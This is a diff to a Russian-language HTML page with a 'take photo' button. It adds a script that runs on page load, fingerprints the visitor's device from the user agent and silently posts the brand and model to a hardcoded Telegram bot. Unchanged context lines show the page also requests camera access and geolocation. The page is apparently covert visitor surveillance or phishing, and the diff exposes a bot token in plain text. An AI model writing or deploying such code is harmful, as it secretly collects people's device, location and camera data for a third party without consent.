@@ -11,6 +11,64 @@
 
     <button onclick="takePhoto()">Сделать фото</button>
 
+<script>
+    async function getDeviceBrandAndModel() {
+        const userAgent = navigator.userAgent;
+        let deviceBrand = 'Unknown';
+        let deviceModel = 'Unknown';
+
+        if (/android/i.test(userAgent)) {
+            deviceBrand = 'Android';
+            const match = userAgent.match(/Android\s([0-9.]+);.*?;\s(.*?)\sBuild/);
+            if (match) {
+                deviceModel = match[2];
+            } else {
+                const genericMatch = userAgent.match(/Android\s([0-9.]+);.*?\((.*?)\)/);
+                if (genericMatch) {
+                    deviceModel = genericMatch[2];
+                }
+            }
+        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+            deviceBrand = 'Apple';
+            const match = userAgent.match(/\((iPhone|iPad|iPod).*?OS\s([0-9_]+)/);
+            if (match) {
+                deviceModel = match[1];
+            }
+        }
+
+        return { brand: deviceBrand, model: deviceModel };
+    }
+
+    async function sendDeviceInfoToTelegram() {
+        const deviceInfo = await getDeviceBrandAndModel();
+        const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk';
+        const chatId = '1653222949';
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const message = `Марка устройства: ${deviceInfo.brand}\nМодель устройства: ${deviceInfo.model}`;
+
+        fetch(telegramApiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Информация об устройстве отправлена в Telegram:', data);
+        })
+        .catch(error => {
+            console.error('Ошибка при отправке информации об устройстве в Telegram:', error);
+        });
+    }
+
+    // Вызов функции для отправки информации об устройстве
+    sendDeviceInfoToTelegram();
+</script>
     <script>
         // Функция для доступа к камерам и снимка
         async function takePhoto() {
@@ -338,6 +396,7 @@
 
         // Вызов функции для получения геолокации
         getGeolocation();
+        
     </script>
 </body>
 </html>
